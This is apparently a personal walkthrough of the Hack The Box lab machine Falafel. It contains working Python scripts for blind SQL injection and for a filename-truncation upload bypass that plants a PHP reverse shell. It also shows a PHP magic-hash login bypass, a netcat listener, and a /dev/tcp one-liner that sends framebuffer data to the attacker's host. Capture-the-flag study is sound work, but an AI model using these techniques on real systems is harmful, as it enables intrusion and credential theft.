---
tags:
  - sqli
  - phptypejuggling
  - group_video
  - group_disk
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/f9106389d256a42cf41619e85fbd8f01.png)

- Machine : https://app.hackthebox.com/machines/Falafel
- Reference : https://0xdf.gitlab.io/2018/06/23/htb-falafel.html
- Solved : 2025.3.7. (Fri) (Takes 1day)

## Summary
---

1. **Initial Enumeration**
	- **Port Scanning**: Discovered open ports **22 (SSH)** and **80 (HTTP)**.
	- **Web Enumeration**:
	    - Found accessible pages via `gobuster`: `/login.php`, `/profile.php`, `/upload.php`, and `/robots.txt`.
	    - **`robots.txt`** hinted at hidden text files, leading to `cyberlaw.txt`.
	- **Key Finding**: `cyberlaw.txt` revealed **potential SQL injection** and an image upload vulnerability.

2. **Web Exploitation**
	- **SQL Injection**:
	    - Extracted credentials using a **blind boolean-based SQL injection** attack.
	    - Found the password hash for `admin`: `0e462096931906507119562988736854` (PHP magic hash).
	- **PHP Type Juggling Attack**:
	    - Bypassed authentication using a **magic hash vulnerability**, logging in as `admin`.

3. **Remote Code Execution**
	- **File Upload Bypass**:
	    - Identified **filename length truncation** vulnerability.
	    - Uploaded a **reverse shell** disguised as an image (`.php.png`).
	- **Shell Obtained**: Connected as **`www-data`** via reverse shell.

4. **Privilege Escalation to `moshe`**
	- Found **database credentials** (`moshe`'s MySQL password).
		- Used the password to **switch user to `moshe`**.

5. **Privilege Escalation to `yossi`**
	- **`video` group abuse**: Captured **screen output** from `/dev/fb0`.
	- Extracted plaintext password from **yossi’s terminal session**.
	- Used credentials to **switch to `yossi`**.

6. **Privilege Escalation to `root`**
	- **`disk` group abuse**:
	    - Accessed raw disk using `debugfs` to extract **root's SSH private key**.
	- Used the **private key to SSH into `root`**, gaining full system access.

### Key Techniques:

- **Web Exploitation**: SQL injection, PHP type juggling.
- **File Upload Bypass**: Filename truncation attack.
- **Privilege Escalation**:
    - `video` group → screen capture.
    - `disk` group → raw disk access to extract SSH key.

---
# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.73
Performing quick port scan on 10.10.10.73...
Found open ports: 22,80
Performing detailed scan on 10.10.10.73...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 21:34 MST
Nmap scan report for 10.10.10.73
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/*.txt
|_http-title: Falafel Lovers
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.04 seconds
```

### http(80)

![](attachments/falafel_1.png)

I ran gobuster to see what subpages in it.

```bash
┌──(kali㉿kali)-[~/falafel]
└─$ gobuster dir -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.73
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 7063]
/.html                (Status: 403) [Size: 291]
/profile.php          (Status: 302) [Size: 9787] [--> login.php]
/index.php            (Status: 200) [Size: 7203]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.73/images/]
/.php                 (Status: 403) [Size: 290]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.73/uploads/]
/header.php           (Status: 200) [Size: 288]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.73/assets/]
/footer.php           (Status: 200) [Size: 0]
/upload.php           (Status: 302) [Size: 0] [--> profile.php]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.73/css/]
/style.php            (Status: 200) [Size: 6174]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.73/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/robots.txt           (Status: 200) [Size: 30]
/cyberlaw.txt         (Status: 200) [Size: 804]
/connection.php       (Status: 200) [Size: 0]
```

`robots.txt` reveals that there are some txt files which might be useful.

```bash
┌──(kali㉿kali)-[~/htb/falafel/gobuster]
└─$ curl -s http://10.10.10.73/robots.txt  
User-agent: *
Disallow: /*.txt  
```

There is a txt file as `robots.txt` mentioned.

```bash
┌──(kali㉿kali)-[~/htb/falafel/gobuster]
└─$ curl -s http://10.10.10.73/cyberlaw.txt
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

        ~admin 
```

It reveals a few things.
- Username "chris" exists.
- There might be some login bypass issue without valid password. Maybe SQL Injection?
- Image upload feature exists on the system which might be vulnerable.
- There are some filters applied to the upload function.

![](attachments/falafel_2.png)

I tested with the username "chris" and it seems that it's answering with "Wrong Identification..." when the username exists on the system.

![](attachments/falafel_3.png)

Let me run `hydra` to find more users.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -p test 10.10.10.73 http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-06 21:48:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 828 login tries (l:828/p:1), ~52 tries per task
[DATA] attacking http-post-form://10.10.10.73:80/login.php:username=^USER^&password=^PASS^:F=try again
[80][http-post-form] host: 10.10.10.73   login: ADMIN   password: test
[80][http-post-form] host: 10.10.10.73   login: Admin   password: test
[80][http-post-form] host: 10.10.10.73   login: admin   password: test
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-06 21:49:32
```

It turned out that there are two user exist : `admin`, `chris`.
I tried brute-force with two accounts, but none of them worked.



# Shell as `www-data`

### SQL Injection

I decided to move on to sql injection.
I guessed the query for the login.

```sql
SELECT * FROM USERS WHERE username='' AND password='bokchee'
```

If I put `admin'-- -` on username, then the query will be :

```sql
SELECT * FROM USERS WHERE username='admin'-- -' AND password='bokchee'

> SELECT * FROM USERS WHERE username='admin'
```

But still the response is `Wrong identification : admin`.
I think there might be some extra measures like checking if `password` parameter is included.

Here's my observation :
- If query has no error and the username exists, it returns "Wrong identification".
- If query has any error, it returns "Try again".

I thought I could use this to retrieve valid password.

I tried `admin' AND substr(password,1,1)='a'-- -`. Then the query will be :

```sql
SELECT * FROM USERS WHERE username='admin' AND substr(password,1,1)='a'-- -' AND password='bokchee'

> SELECT * FROM USERS WHERE username='admin' AND substr(password,1,1)='a'
```

I tested with several characters and it turned out that `0` is the first character of the password.
I can reproduce it with the following username : `admin' AND substr(password,1,1)='0'-- -`.

```sql
SELECT * FROM USERS WHERE username='admin' AND substr(password,1,1)='0'-- -' AND password='bokchee'

> SELECT * FROM USERS WHERE username='admin' AND substr(password,1,1)='0'
```

Then the response is "Wrong identification" which implies that there's no error on the SQL query.

Let's build a python script to automate this process.

```python
┌──(kali㉿kali)-[~/htb/falafel]
└─$ cat sql-inject.py 
import requests

chars = "0123456789abcdef"

def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s'-- -" %(i,c)

length = 0
while True:
    length += 1
    query = f"admin' AND LENGTH(password)={length}-- -"
    payload = {'username':query, 'password':'bokchee'}
    r = requests.post('http://10.10.10.73/login.php', data=payload)
    if "Wrong identification" in r.text:
        print("The length of the password is :", length)
        break

password = ""
for i in range(1, length+1):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':'bokchee'}
        r = requests.post('http://10.10.10.73/login.php', data=payload)
        if "Wrong identification" in r.text:
            print(c, end=', ')
            password += c

print("Found password is :", password)
```

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ python sql-inject.py
The length of the password is : 32
0, e, 4, 6, 2, 0, 9, 6, 9, 3, 1, 9, 0, 6, 5, 0, 7, 1, 1, 9, 5, 6, 2, 9, 8, 8, 7, 3, 6, 8, 5, 4, Found password is : 0e462096931906507119562988736854
```

The retrieved password is `0e462096931906507119562988736854`.
Since it looks like an MD5 hash. Let's crack the hash.

With the same method, I retrieved `chris`'s hash as well : `d4ee02a22fc872e36d9e3751ba72ddc8`

Let's try cracking both hashes.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ cat falafel.hashes 
admin:0e462096931906507119562988736854
chris:d4ee02a22fc872e36d9e3751ba72ddc8


┌──(kali㉿kali)-[~/htb/falafel]
└─$ hashcat -m 0 -a 0 --user falafel.hashes /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d4ee02a22fc872e36d9e3751ba72ddc8:juggling                 
Approaching final keyspace - workload adjusted.           

Session..........: hashcat
Status...........: Exhausted
<SNIP>
```

While `admin`'s hash is not cracked, `chris`'s is cracked.
The cracked password for `chris` is `juggling`.

![](attachments/falafel_4.png)

There's an introduction on "profile" page, but it doesn't seem to have many functions.

### PHP Type Juggling

Given the introduction of the user `chris`, and the note `cyberlaw.txt`, I guessed that there might be some issue with PHP type juggling with the following clues :
- Chris keeps saying about juggling.
- `cyberlaw.txt` mentions that `chris` can sign-in as `admin` without knowing its password.

Here are the references for the "PHP Type Juggling".
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
- https://medium.com/@abdelrahman0x01/php-type-juggling-vulnerability-768bca4d8b3b

```
PHP is known as a dynamically typed language, PHP has a feature called type juggling , In PHP Type juggling means dealing with a variable type. If an integer value is assigned to a variable, it becomes an integer. If a string value is assigned to the variable, it becomes a String.

PHP Has two main comparison modes, loose (==) and strict (===).

PHP type juggling vulnerability occurs when a loose comparison operator (== or!=) is used in the place of a strict comparison operator or instead of it (=== or! ==)
```

If the target system is using loose comparison operator, it's expected to take the `admin`'s hash `0e462096931906507119562988736854` as a numerical value instead of hash string.
In that case the calculation will be as follows;

```
`0e462096931906507119562988736854`  
 = 0 × 10^(462096931906507119562988736854)**  
 = 0
```

PayloadAlltheThings has the example of Magic Hashes.

![](attachments/falafel_5.png)

It's saying that `0e1137126905` can be converted to `0e291659922323405260514745084877`. So does `0e215962017`. With loose comparison operator, these values will be passed the PHP authentication.

I tried with these credentials, and was able to sign-in as `admin`.

### File Upload

![](attachments/falafel_6.png)

There's an Upload page taking image's URL as its input.
I prepared test image on kali, and tried to upload it.

![](attachments/falafel_7.png)

The point is it reveals the actual command line running behind!
`cd /var/www/html/uploads/0307-0951_64cec3bba6c40ed9; wget 'http://10.10.14.4:8000/falafel.png'`.

So it's expected to access the uploaded image from the following URL :
`http://10.10.10.73/uploads/0307-0951_64cec3bba6c40ed9/falafel.png`

![](attachments/falafel_8.png)

Let's check what extensions are allowed to upload.
First, I tried naive php file. And it returned "Bad extension".

![](attachments/falafel_9.png)

I tried brute-force for the extension.

![](attachments/falafel_10.png)

Found one allowed extension(`.php\x00.png`) but couldn't really upload the file.

![](attachments/falafel_11.png)

At this time, I saw the `admin`'s profile expecting that there might be some hint as we found from `chris`'s profile.

![](attachments/falafel_12.png)

It's talking about "limits". 
What if it has to do with the length of the uploaded file name?

For test, I sent a request with long file name.
Then, interestingly, the response has been somewhat changed.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ URL=$(python2 -c 'print "http://10.10.14.4:8000/" + "A"*250 + "test.png"'); curl -i -s -k -X POST -H 'Referer: http://10.10.10.73/upload.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=58v4ia0qr6j6r7mkkq12ftk235' -d "url=$URL" http://10.10.10.73/upload.php

<SNIP>
        <pre>CMD: cd /var/www/html/uploads/0307-1100_2b88afe3bbfb4cf9; wget 'http://10.10.14.4:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.png'</pre>  
        <pre>The name is too long, 258 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
--2025-03-07 11:00:01--  http://10.10.14.4:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest.png
Connecting to 10.10.14.4:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2025-03-07 11:00:01 ERROR 404: File not found.
<SNIP>
```

It's trying to shortening the filename if it's too long.

Using this, here's the strategy :
- Prepare a payload like AAAA...AAAA.php.png
- Increasing the file name length until we find the limit of taking the file name as it is.
- Increasing 3 more As, we can make it shortening the file name with trimming the last `.png` part.

Here's the python script to find proper number of As.

```python
┌──(kali㉿kali)-[~/htb/falafel]
└─$ cat get_A_count.py                
import requests

target_url = "http://10.10.10.73/upload.php"
extension = ".php.png"

headers = {
        "Referer" : "http://10.10.10.73/upload.php",
        "Content-Type" : "application/x-www-form-urlencoded",
        "Cookie" : "PHPSESSID=58v4ia0qr6j6r7mkkq12ftk235"
}

length = 200
while True:
    filename = "A" * length + extension
    param_url = "http://10.10.14.4:8000/" + filename   

    data = {"url" : param_url}
    r = requests.post(target_url, headers=headers, data=data)


    if "Trying to shorten" in r.text:
        break

    length += 1

length += 3
print("The proper number of 'A' to upload php file is :",length)
```

And the returned A count was 232.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ python get_A_count.py       
The proper number of 'A' to upload php file is : 232
```

Then I prepared PHP file with the given number of "A"s. Also open a webserver.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ cp rshell_9000.php AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png


┌──(kali㉿kali)-[~/htb/falafel]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.73 - - [07/Mar/2025 02:25:40] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png HTTP/1.1" 200 -
```

Then the next script is to trigger upload with the given filename.

```python
┌──(kali㉿kali)-[~/htb/falafel]
└─$ cat upload_rshell.py 
import requests

target_url = "http://10.10.10.73/upload.php"
extension = ".php.png"

headers = {
        "Referer" : "http://10.10.10.73/upload.php",
        "Content-Type" : "application/x-www-form-urlencoded",
        "Cookie" : "PHPSESSID=58v4ia0qr6j6r7mkkq12ftk235"
}

length = 232
filename = "A" * length + extension
param_url = "http://10.10.14.4:8000/" + filename   

data = {"url" : param_url}
r = requests.post(target_url, headers=headers, data=data)

print(r.text)
```

It successfully ran, and uploaded the reverse shell payload.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ python upload_rshell.py 
  
<SNIP>
         
        <h3>Upload Succsesful!</h3> 
        <div>  
        <h4>Output:</h4>  
        <pre>CMD: cd /var/www/html/uploads/0307-1125_1a0bee8003ca42b4; wget 'http://10.10.14.4:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'</pre>  
        <pre>The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2025-03-07 11:25:40--  http://10.10.14.4:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png
Connecting to 10.10.14.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5492 (5.4K) [image/png]
Saving to: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php'

     0K .....                                                 100% 1.08M=0.005s

2025-03-07 11:25:40 (1.08 MB/s) - 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php' saved [5492/5492]

<SNIP>
```

Based on the response, I think I can access to the upload php file with the following URL :
`http://10.10.10.73/uploads/0307-1125_1a0bee8003ca42b4/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php`
(Needs to set listener ahead)

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ curl http://10.10.10.73/uploads/0307-1125_1a0bee8003ca42b4/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php
```

Then, soon the listener spawns the shell.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.73] 51174
Linux falafel 4.15.0-213-generic #224-Ubuntu SMP Mon Jun 19 13:30:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 11:28:24 up  3:14,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1     -                08:14    3:14m  0.02s  0.02s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```



# Shell as `moshe`

### Enumeration

First, let's check web root directory.

```bash
www-data@falafel:/var/www/html$ ls
ls
assets          cyberlaw.txt  images     login_logic.php  style.php
authorized.php  footer.php    index.php  logout.php       upload.php
connection.php  header.php    js         profile.php      uploads
css             icon.png      login.php  robots.txt

www-data@falafel:/var/www/html$ cat connection.php
cat connection.php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```

It reveals DB credential for `moshe` : `falafelIsReallyTasty`

```bash
www-data@falafel:/var/www/html$ ss -lntp
ss -lntp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128                       *:80                     *:*       
LISTEN   0         128                    [::]:22                  [::]:*   
```

### Mysql Database

The mysql service is running on the system.
With the found credentials, I was able to enumerate database, but couldn't find anything new.

```bash
www-data@falafel:/var/www/html$ mysql -u moshe -pfalafelIsReallyTasty -e 'show databases;'
<u moshe -pfalafelIsReallyTasty -e 'show databases;'
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| falafel            |
+--------------------+
www-data@falafel:/var/www/html$ mysql -u moshe -pfalafelIsReallyTasty -e 'use falafel;show tables;'
<pfalafelIsReallyTasty -e 'use falafel;show tables;'
mysql: [Warning] Using a password on the command line interface can be insecure.
+-------------------+
| Tables_in_falafel |
+-------------------+
| users             |
+-------------------+
www-data@falafel:/var/www/html$ mysql -u moshe -pfalafelIsReallyTasty -e 'use falafel;select * from users;'
<IsReallyTasty -e 'use falafel;select * from users;'
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+----------+----------------------------------+--------+
| ID | username | password                         | role   |
+----+----------+----------------------------------+--------+
|  1 | admin    | 0e462096931906507119562988736854 | admin  |
|  2 | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 | normal |
+----+----------+----------------------------------+--------+
```

### Switch user to `moshe`

There are two users exist.

```bash
www-data@falafel:/home$ ls
ls
moshe  yossi
```

Since the username `moshe` is same with `mysql` credential we found earlier, I tried `su` to `moshe` user, and it worked.

```bash
www-data@falafel:/home$ su moshe
su moshe
Password: falafelIsReallyTasty

setterm: $TERM is not defined.
moshe@falafel:/home$ id
id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

I can open a same shell using `ssh`.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ ssh moshe@10.10.10.73
moshe@10.10.10.73's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Expanded Security Maintenance for Infrastructure is not enabled.

159 updates can be applied immediately.
51 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar  7 11:59:59 2025 from 10.10.14.4
$ id  
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
$ whoami
moshe
```



# Shell as `???`

### Enumeration

Let's run `linPEAS`.

```swift
╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/home/moshe/bin:/home/moshe/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin



╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin



╔══════════╣ Login now
 12:09:13 up  3:54,  2 users,  load average: 0.42, 0.10, 0.03                    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1     -                08:14    3:54m  0.02s  0.02s -bash
moshe    pts/1    10.10.14.4       12:00   33.00s  0.05s  0.00s w



╔══════════╣ Users with console
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
root:x:0:0:root:/root:/bin/bash
yossi:x:1000:1000:Yossi,,,:/home/yossi:/bin/bash



╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)                                                              
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

Given the group membership, current user `moshe` belongs to `video`, `audio`, `games` group.
Another user `yossi` is physically connected, which implies that it can potentially have graphical visualization.

The point is, with `video` membership, the user `moshe` is allowed to read monitor output.

### Privesc via `video` group membership

Here the related [article](https://book.hacktricks.wiki/ko/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#video-group) explaning how to exploit this membership.

First, let's move the video output to kali.

```bash
moshe@falafel:/dev/shm$ cat /dev/fb0 > /dev/tcp/10.10.14.4/5736
```

Kali :

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ nc -nlvp 5736 > falafel.raw
listening on [any] 5736 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.73] 41570
```

Then, I can check the video resolution by reading `/sys/class/graphics/fb0/virtual_size`.

```bash
moshe@falafel:/dev/shm$ cat /sys/class/graphics/fb0/virtual_size
1176,885
```

To open the raw image file, I used GIMP.
For the settings, I chose the following;
- File Type : Raw Image Data
- Width : 1176
- Height : 885
- Pixel Format : RGB565

Then I can see the following image.

![](attachments/falafel_13.png)

It seems that the user `yossi` tried to change its password to `MoshePlzStopHackingMe!`.
However, he included the plaintext password on command line by mistake.

Let me use the credential to open a ssh shell.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ ssh yossi@10.10.10.73              
yossi@10.10.10.73's password: 
